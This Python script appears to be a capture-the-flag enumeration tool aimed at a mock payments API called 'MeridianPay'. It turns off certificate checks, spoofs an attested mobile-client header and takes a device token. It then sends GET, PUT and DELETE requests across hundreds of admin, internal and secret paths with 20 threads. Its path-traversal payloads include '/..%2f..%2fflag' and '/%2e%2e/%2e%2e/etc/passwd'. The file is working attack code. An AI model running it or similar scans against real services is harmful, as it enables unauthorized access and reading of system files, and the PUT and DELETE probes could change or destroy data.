import json, ssl, urllib.request, urllib.error, sys
from concurrent.futures import ThreadPoolExecutor

BASE = "https://web-3f25599ac74e8a91.web.h7tex.com"
CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
CL = "MeridianPay-Android/3.2.1 (attested)"

def raw(p, m="GET", b=None, t=None, cl=CL, hdrs=None):
    h = {"Content-Type": "application/json"}
    if cl: h["X-Meridian-Client"] = cl
    if t: h["Authorization"] = "Bearer " + t
    if hdrs: h.update(hdrs)
    d = json.dumps(b).encode() if b is not None else None
    r = urllib.request.Request(BASE+p, data=d, method=m, headers=h)
    try:
        with urllib.request.urlopen(r, context=CTX, timeout=8) as f: return f.status, f.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return None, repr(e)

_, t = raw("/api/v1/auth/device","POST",{"device_id":"path-probe"})
TOKEN = json.loads(t)["token"]

PRE = ["/api/v1","/api","/api/v1/internal","/api/v1/admin","/api/v1/auth","/api/v1/files","/api/v1/receipts",
       "/api/v1/export","/api/v1/promo","/api/v1/mobile","/api/v1/device","/api/v1/session","/api/v1/user",
       "/api/v1/users","/api/v1/account","/api/v1/accounts","/api/v1/risk","/api/v1/kyc","/api/v1/config",
       "/api/v1/receipt","/api/v1/file","/api/v1/download","/api/v1/document","/api/v1/documents",
       "/api/v1/report","/api/v1/reports","/api/v1/attachment","/api/v1/static","/api/v1/attachment"]
SUF = ["/receipt-8827.txt","/receipt.txt","/flag","/flag.txt","/../../../flag","/..%2f..%2fflag",
       "/%2e%2e/%2e%2e/etc/passwd","/1","/1001","/me","/current","/export","/public","/latest","/x","/"]

paths=[]
for p in PRE:
    for s in SUF:
        paths.append(p+s)
extra = ["/flag","/flag.txt","/api/v1/promo/public/","/api/v1/internal/promo/","/api/v1/admin/ledger/export",
         "/api/v1/admin/ledger/flag","/api/v1/admin/flags","/api/v1/auth/device/1001","/api/v1/devices",
         "/api/v1/device/attest","/api/v1/attest","/api/v1/attestation","/api/v1/webview","/api/v1/intent",
         "/api/v1/deeplink","/api/v1/link/open","/api/v1/links","/api/v1/share","/api/v1/sessions",
         "/api/v1/profile/1002","/api/v1/profile/me","/api/v1/admin","/api/v1/admin/","/api/v1/internal",
         "/api/v1/internal/","/api/v1/internal/flag","/api/v1/healthz","/api/v1/version","/api/v1",
         "/api/v1/","/api","/api/","/","/favicon.ico","/static/js/app.js","/app.js","/main.js","/bundle.js",
         "/api/v1/swagger","/api/v1/openapi.json","/api/v1/spec","/api/v1/routes","/api/v1/debug/routes",
         "/api/v1/admin/routes","/api/v1/admin/config","/api/v1/admin/secrets","/api/v1/admin/promo",
         "/api/v1/admin/promotions","/api/v1/admin/audit","/api/v1/admin/users","/api/v1/admin/keys",
         "/api/v1/cfo","/api/v1/ceo","/api/v1/staff","/api/v1/corporate","/api/v1/master"]
paths += [p for p in extra if p not in paths]

def work(p):
    out=[]
    for m in ("GET","PUT","DELETE"):
        c,b = raw(p, m, None if m=="GET" else {}, TOKEN)
        if c and c!=404 and "404 Not Found" not in b:
            out.append((m,c,b[:250]))
    return (p,out) if out else None

with ThreadPoolExecutor(max_workers=20) as ex:
    for r in ex.map(work, paths):
        if r: print(r[0], r[1], flush=True)
print("DONE")
